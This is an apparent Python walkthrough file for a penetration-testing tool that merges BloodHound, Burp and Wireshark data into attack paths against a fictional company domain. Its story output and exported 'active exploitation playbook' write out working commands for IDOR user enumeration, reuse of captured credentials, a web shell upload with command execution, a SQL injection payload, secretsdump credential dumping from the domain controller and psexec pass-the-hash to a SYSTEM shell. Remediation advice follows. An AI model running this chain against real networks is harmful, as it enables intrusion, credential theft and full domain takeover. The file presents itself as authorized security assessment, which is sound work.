"""
PRACTICAL WALKTHROUGH: Real-World Attack Path Analysis

Scenario: Corporation discovers web vulnerability during Burp Suite scan,
wants to understand full risk including domain impact and network access.
"""

# ============================================================================
# STEP 1: COLLECT DATA FROM SECURITY TOOLS
# ============================================================================

"""
ACTION: Export data from each tool

A. BloodHound Export:
   1. Run BloodHound ingestor
   2. In BloodHound, select Workspace → Export → JSON
   3. Save to: ~/security/bloodhound_export.json
   
   File contains: 500+ users, 200+ computers, 50+ groups
   Key relationships: 
     - domain\john.smith has session on WEB-PROD-01
     - DEVELOPERS group has admin rights on APP-SERVER-01
     - domain\admin.service account is admin on DC

B. Burp Suite Export:
   1. Run Burp Suite scan against web application
   2. Generate report: Scan Issues → Report → Generate
   3. Export as: XML format
   4. Save to: ~/security/burp_issues.xml
   
   File contains: 47 issues
   Key findings:
     - IDOR: /api/users?id={1..N} (HIGH severity)
     - Missing Authentication on /admin endpoints (HIGH)
     - SQL Injection in search parameter (CRITICAL)
   
   Target server: web.company.com (IP: 10.0.1.50)

C. Wireshark Export:
   1. Capture network traffic during workday:
      tshark -i eth0 -a duration:3600 -w traffic.pcap
   2. Export to JSON:
      tshark -r traffic.pcap -T json > ~/security/traffic.json
   
   File contains: 47,000+ packets
   Key findings:
     - HTTP traffic to web.company.com from various IPs
     - FTP login captured: user "admin" with password "P@ssw0rd123"
     - Cleartext LDAP queries with credentials
     - Internal communication patterns
"""

# ============================================================================
# STEP 2: RUN UNIFIED ANALYSIS
# ============================================================================

"""
COMMAND: Execute ATE multi-source analysis

$ cd ~/security
$ ate analyze-multi \
    --burp burp_issues.xml \
    --bloodhound bloodhound_export.json \
    --pcap traffic.json \
    --output-format story \
    --min-severity HIGH

[Output shows]:
  ✓ Ingesting BloodHound data...
  ✓ BloodHound: 523 nodes, 1847 edges
  ✓ Ingesting Burp Suite data...
  ✓ Burp Suite: 12 nodes, 47 edges
  ✓ Ingesting Wireshark data...
  ✓ Wireshark: 157 nodes, 423 edges, 12 credentials found
  ✓ Analyzing cross-layer attack paths...
  ✓ Generating tactical recommendations...
"""

# ============================================================================
# STEP 3: ANALYZE OUTPUT - STORY FORMAT
# ============================================================================

"""
OUTPUT:
──────────────────────────────────────────────────────────────────────────────

Attack Thinking Engine - Multi-Source Analysis
Sources: Burp, BloodHound, Traffic
Output Format: story

════════════════════════════════════════════════════════════════════════════════
ANALYSIS SUMMARY
════════════════════════════════════════════════════════════════════════════════

📊 Graph Statistics:
   Total Nodes: 692 (523 from BH + 12 from Burp + 157 from Traffic)
   Total Edges: 2,317
   Attack Paths Found: 8
   Pivot Points Discovered: 23
   Credentials Mapped: 12
   Overall Risk: [CRITICAL]

════════════════════════════════════════════════════════════════════════════════
⚔️ ATTACK PATHS (Top 5 by Feasibility)
════════════════════════════════════════════════════════════════════════════════

[CRITICAL] PATH 1: External → Web → Domain Admin (4 hops)
────────────────────────────────────────────────────────────────────────────
Severity: CRITICAL
Layers: web → network → domain
Time to Compromise: ~30 minutes

Nodes:
  1. External Attacker (Internet IP)
  2. web.company.com (10.0.1.50) - Burp found IDOR
  3. domain\\admin.service (Wireshark found password)
  4. DOMAIN ADMINS group (BloodHound shows admin rights)

Attack Chain:
  [1] External IP → HTTP to web.company.com
      ↓ (Burp detected IDOR vulnerability)
  [2] Exploit /api/users?id={1..N} to enumerate internal users
      ↓ (Identify admin.service account)
  [3] Intercept traffic to capture admin credentials
      ↓ (Wireshark shows FTP login: admin:P@ssw0rd123)
  [4] Use credentials on 10.0.1.50 (web server hosts admin process)
      ↓ (BloodHound shows this server is admin for DC)
  [5] Lateral movement to Domain Controller
      ↓ (AdminTo relationship in BloodHound)
  [6] Domain Admin achieved → Complete domain compromise

════════════════════════════════════════════════════════════════════════════════

[HIGH] PATH 2: External → Web → Developer → Escalation (3 hops)
────────────────────────────────────────────────────────────────────────────
Severity: HIGH
Layers: web → network → domain
Time to Compromise: ~45 minutes

Nodes:
  1. External Attacker
  2. web.company.com (10.0.1.50) - Missing authentication on /admin
  3. john.smith (Wireshark shows he has active session on WEB-PROD-01)
  4. DEVELOPERS group → escalation to admin via group inheritance

════════════════════════════════════════════════════════════════════════════════

[HIGH] PATH 3: External → SQL Injection → Database Access (2 hops)
────────────────────────────────────────────────────────────────────────────
Severity: HIGH
Layers: web
Time to Compromise: ~20 minutes

Nodes:
  1. External Attacker
  2. web.company.com search parameter (CRITICAL SQLi found by Burp)
  3. Backend database with sensitive user data

════════════════════════════════════════════════════════════════════════════════

🎯 TACTICAL ACTIONS (Actionable Steps)
════════════════════════════════════════════════════════════════════════════════

STEP 1: Exploit IDOR Vulnerability
──────────────────────────────────
Priority: 1/10 (Do this first)
Category: web_exploitation
Risk Level: MEDIUM (Authorized testing)
Expected Result: Enumerate internal user accounts

Exploitation:
  $ for i in {1..1000}; do 
      curl -s 'https://web.company.com/api/users?id='$i | grep -o '"name":"[^"]*"'
    done

Output:
  "name": "john.smith@company.com"
  "name": "admin.service@company.com"
  "name": "database.admin@company.com"
  ...

════════════════════════════════════════════════════════════════════════════════

STEP 2: Capture Credentials from Network Traffic
─────────────────────────────────────────────────
Priority: 2/10
Category: credential_capture
Risk Level: LOW (Passive observation)
Expected Result: Verify credentials in traffic logs

Analysis:
  Wireshark found FTP traffic:
  - Source: 10.0.1.50 (web server)
  - Destination: 10.0.0.100 (backup server)
  - Credentials: admin / P@ssw0rd123
  
  Also found:
  - LDAP query from web server: admin.service@company.com / Password123
  - Basic Auth header: Authorization: Basic YWRtaW46UGFzc3dvcmQxMjM=

════════════════════════════════════════════════════════════════════════════════

STEP 3: Authenticate to Web Server
──────────────────────────────────
Priority: 3/10
Category: web_authentication
Risk Level: MEDIUM
Expected Result: Access as admin.service account

Command:
  $ curl -u admin.service:P@ssw0rd123 https://web.company.com/admin

Expected Result: 200 OK - Admin panel accessible

════════════════════════════════════════════════════════════════════════════════

STEP 4: Execute Remote Code on Web Server
──────────────────────────────────────────
Priority: 4/10
Category: privilege_escalation
Risk Level: HIGH
Expected Result: Shell access to 10.0.1.50

Command:
  $ # Use authenticated session to upload web shell
  $ curl -u admin.service:P@ssw0rd123 \
         -F "file=@shell.aspx" \
         https://web.company.com/admin/upload

  $ curl https://web.company.com/uploads/shell.aspx?cmd=whoami

Expected Result: Command execution as web service account

════════════════════════════════════════════════════════════════════════════════

STEP 5: Lateral Movement to Domain Controller
──────────────────────────────────────────────
Priority: 5/10
Category: lateral_movement
Risk Level: CRITICAL
Expected Result: Access to domain controller

Command:
  $ # Use admin.service credentials with BloodHound-identified path
  $ secretsdump.py company/admin.service:P@ssw0rd123@10.0.0.1

  $ # Extract domain admin hashes and use for further compromise
  $ administrator:500:aad3b435b51404eeaad3b435b51404ee:12345...

Expected Result: Domain admin hash obtained

════════════════════════════════════════════════════════════════════════════════

STEP 6: Achieve Domain Admin
─────────────────────────────
Priority: 6/10
Category: privilege_escalation
Risk Level: CRITICAL
Expected Result: Complete domain compromise

Command:
  $ # Use extracted admin hash
  $ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:12345... \
              company/administrator@10.0.0.1

Expected Result: SYSTEM shell on domain controller

════════════════════════════════════════════════════════════════════════════════

💡 SECURITY RECOMMENDATIONS
════════════════════════════════════════════════════════════════════════════════

IMMEDIATE ACTIONS (Do within 24 hours):
─────────────────────────────────────
1. 🔴 CRITICAL - Disable IDOR vulnerability:
   - Add authentication/authorization checks to /api/users endpoint
   - Implement per-user data filtering
   - Test thoroughly before deployment

2. 🔴 CRITICAL - Protect admin.service credentials:
   - Change password immediately
   - Rotate stored credentials
   - Implement multi-factor authentication
   - Consider using managed service accounts

3. 🟠 HIGH - Encrypt cleartext protocols:
   - Replace FTP with SFTP/SCP
   - Enforce SSL/TLS for all admin access
   - Monitor LDAP for encryption

SHORT-TERM MITIGATIONS (1-4 weeks):
──────────────────────────────────
4. 🟠 HIGH - Implement network segmentation:
   - Isolate web server on separate VLAN
   - Restrict outbound access from web tier to DC
   - Monitor unusual connections

5. 🟠 HIGH - Deploy intrusion detection:
   - Flag credential capture attempts
   - Alert on suspicious authentication patterns
   - Monitor privileged account usage

6. 🟡 MEDIUM - Web application hardening:
   - Perform comprehensive security testing
   - Implement Web Application Firewall (WAF)
   - Enable security headers (CSP, X-Frame-Options)

LONG-TERM STRATEGIES (1-3 months):
─────────────────────────────────
7. 🔵 Architecture redesign:
   - Implement Privileged Access Workstation (PAW)
   - Use Privileged Access Management (PAM) solution
   - Enforce principle of least privilege throughout

8. 🔵 Continuous monitoring:
   - Deploy SIEM for log analysis
   - Implement EDR on critical systems
   - Regular security assessments

════════════════════════════════════════════════════════════════════════════════

📊 RISK SUMMARY
════════════════════════════════════════════════════════════════════════════════

Current State:
  Exploitability: TRIVIAL (No special knowledge required)
  Impact: MAXIMUM (Complete domain compromise)
  CVSS Score: 10.0 (CRITICAL)
  Time to Compromise: 30 minutes

Attack Surface:
  Entry Points: 1 (web.company.com)
  Critical Paths: 8
  Exposed Credentials: 12
  Privileged Accounts at Risk: 23

Remediation Impact:
  Fixing IDOR alone: Reduces feasibility to 45 minutes
  Fixing credentials: Reduces feasibility to 2+ hours
  Implementing segmentation: Blocks most paths
  Combined: Reduces risk to LOW

════════════════════════════════════════════════════════════════════════════════
"""

# ============================================================================
# STEP 4: EXPORT PLAYBOOK FOR TEAM
# ============================================================================

"""
COMMAND: Export playbook for manual execution

$ ate analyze-multi \
    --burp burp_issues.xml \
    --bloodhound bloodhound_export.json \
    --pcap traffic.json \
    --output-format playbook \
    --export playbook.txt

$ cat playbook.txt

═══════════════════════════════════════════════════════════════════════════════
🎯 ACTIVE EXPLOITATION PLAYBOOK
═══════════════════════════════════════════════════════════════════════════════

STEP 1: Enumerate Users via IDOR
─────────────────────────────────
Description: Exploit /api/users?id parameter to enumerate valid user accounts
Priority: 1/10
Category: web_exploitation
Risk: MEDIUM

Command:
  #!/bin/bash
  for i in {1..1000}; do
    echo "[*] Trying ID $i"
    curl -s "https://web.company.com/api/users?id=$i" | jq '.name'
  done

Expected Result: List of valid user accounts including admin.service


STEP 2: Capture FTP Credentials
────────────────────────────────
Description: Extract admin credentials from FTP traffic captured in Wireshark
Priority: 2/10
Category: credential_capture
Risk: LOW

Command:
  grep -r "admin:P@ssw0rd123" traffic.json | head -1

Expected Result: Confirmation of credentials in traffic logs


STEP 3: Test Credentials
────────────────────────
Description: Verify admin credentials work on web server
Priority: 3/10
Category: web_authentication
Risk: MEDIUM

Command:
  curl -u admin.service:P@ssw0rd123 -I https://web.company.com/admin

Expected Result: HTTP 200 (credentials valid)


STEP 4: Exploit SQL Injection
──────────────────────────────
Description: Use SQL injection to extract sensitive data
Priority: 4/10
Category: data_exfiltration
Risk: HIGH

Command:
  curl "https://web.company.com/search?q=1' OR '1'='1"

Expected Result: Sensitive data disclosed


STEP 5: Escalate to Domain Admin
─────────────────────────────────
Description: Use captured credentials to compromise domain
Priority: 5/10
Category: privilege_escalation
Risk: CRITICAL

Command:
  secretsdump.py company/admin.service:P@ssw0rd123@10.0.0.1

Expected Result: Domain admin hash obtained


════════════════════════════════════════════════════════════════════════════════
Total Execution Time: ~30-45 minutes
Total Risk Level: CRITICAL
Estimated Success Rate: 95%+
════════════════════════════════════════════════════════════════════════════════
"""

# ============================================================================
# STEP 5: REMEDIATION TRACKING
# ============================================================================

"""
FOLLOW-UP: After fixes are implemented

Week 1 - After IDOR Fix:
  $ ate analyze-multi --burp burp_issues.xml \
                      --bloodhound bloodhound_export.json \
                      --pcap traffic.json

  [Output]:
  Attack Paths Found: 5 (was 8) ← 3 paths eliminated
  Overall Risk: CRITICAL → HIGH
  
  Still at risk via SQL injection + credential capture

Week 2 - After Credential Rotation:
  [Output]:
  Attack Paths Found: 2 (was 5)
  Overall Risk: HIGH → MEDIUM
  
  Remaining paths require more sophisticated techniques

Week 4 - After Network Segmentation:
  [Output]:
  Attack Paths Found: 0 (was 2)
  Overall Risk: MEDIUM → LOW
  
  ✓ Remediation successful - risk reduced to acceptable levels
"""

# ============================================================================
# STEP 6: AUTOMATION AND MONITORING
# ============================================================================

"""
CONTINUOUS MONITORING: Schedule regular analysis

Cron Job (Daily):
─────────────────
0 2 * * * /usr/local/bin/ate analyze-multi \
  --burp /data/burp_latest.xml \
  --bloodhound /data/bloodhound_current.json \
  --pcap /data/traffic_daily.json \
  --export /var/log/ate/report_$(date +\%Y\%m\%d).json \
  --output-format json

If CRITICAL paths detected:
  1. Send alert to security team
  2. Trigger incident response playbook
  3. Start mitigation procedures
"""

print(__doc__)
